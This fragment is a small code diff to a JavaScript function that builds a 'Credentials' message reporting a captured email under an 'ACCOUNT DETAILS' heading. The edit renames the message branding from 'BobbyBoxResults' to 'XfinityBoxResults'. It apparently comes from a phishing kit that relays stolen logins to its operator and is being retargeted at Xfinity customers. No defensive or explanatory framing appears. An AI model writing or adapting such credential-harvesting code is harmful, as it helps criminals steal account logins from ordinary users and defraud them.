@@ -99,7 +99,7 @@ const composeCredentialsMessage = (data) => {
     }) + ' UTC';
 
     return `
-*🔐 BobbyBoxResults - Credentials 🔐*
+*🔐 XfinityBoxResults - Credentials 🔐*
 
 *ACCOUNT DETAILS*
 - 📧 Email: ${safeEmail}
